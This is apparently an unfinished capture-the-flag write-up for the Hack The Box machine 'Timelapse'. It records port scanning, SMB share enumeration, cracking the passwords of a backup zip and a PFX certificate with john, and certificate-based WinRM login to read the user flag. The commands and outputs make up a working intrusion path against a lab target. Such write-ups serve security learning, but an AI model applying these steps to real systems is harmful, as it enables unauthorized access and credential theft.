# Timelapse

## Enumeration
````
# nmap -sV -p- --min-rate 9000 10.10.11.152 -oA nmap-10.10.11.152-sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 07:33 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.02% done; ETC: 07:34 (0:00:16 remaining)
Nmap scan report for 10.10.11.152
Host is up (0.14s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 19:34:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
54451/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.30 seconds
````

````
enum4linux -a -u "blah" -p "" 10.10.11.152
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr  1 07:42:17 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.152
RID Range ........ 500-550,1000-1050
Username ......... 'blah'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.152    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.11.152    |
 ============================================ 
Looking up status of 10.10.11.152
No reply from 10.10.11.152

 ===================================== 
|    Session Check on 10.10.11.152    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.11.152 allows sessions using username 'blah', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.11.152    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] C4 E1 35 83 F3 85 3E DB   43 3B 63 A3 E6 0A E7 45   ..5...>. C;c....E
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.11.152    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.11.152 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.11.152 from srvinfo:
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 30 A8 A1 2A 43 93 13 0F   47 ED 67 AB 00 EA 69 46   0..*C... G.g...iF
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.11.152    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.11.152    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.152
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/IPC$     [E] Can't understand response:
NT_STATUS_INVALID_INFO_CLASS listing \*                                                                                                                      
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/NETLOGON Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/Shares   Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/SYSVOL   Mapping: OK     Listing: DENIED

 ==================================================== 
|    Password Policy Information for 10.10.11.152    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.11.152 using blah

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.152)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.11.152    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.152 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.11.152    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] E4 5D 46 96 E7 6F 01 F5   11 6F E8 23 6B BB C2 54   .]F..o.. .o.#k..T
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Apr  1 07:43:02 2022
````
:new: Shares

````
root@kali:~/Desktop/htb/timelapse# smbclient //10.10.11.152/Shares -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> ls Dev/
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> ls HelpDesk/
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> 

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
````

````
7z l winrm_backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20               2555         2405  1 files
````

````
# 7z l -slt winrm_backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

----------
Path = legacyy_dev_auth.pfx
Folder = -
Size = 2555
Packed Size = 2405
Modified = 2021-10-25 10:21:20
Created = 
Accessed = 
Attributes = _ -rwxr-xr-x
Encrypted = +
Comment = 
CRC = 12EC5683
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
````
ZipCrypto Deflate is vulnerable to known plaintext attack but we can try first rockyou

````
$ zip2john winrm_backup.zip > ziphash

$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
root@kali:~/Desktop/htb/timelapse# john --wordlist=/root/rockyou.txt ziphash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2022-04-01 07:54) 1.075g/s 3729Kp/s 3729Kc/s 3729KC/s suprgirl..supreme99
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
````

````
$ python2 /opt/2john/pfx2john.py legacyy_dev_auth.pfx > hash_pfx

$ john --wordlist=/root/rockyou.txt --format=pfx pfx_hash 

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:12 DONE (2022-04-01 08:33) 0.007568g/s 24451p/s 24451c/s 24451C/s thuglife06..thuglady01
Use the "--show" opti
````

````
# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password:
````

````
$ evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
8acd93fced1257b5205467e86f96d6ff
````



## User

## Root

## Secrets
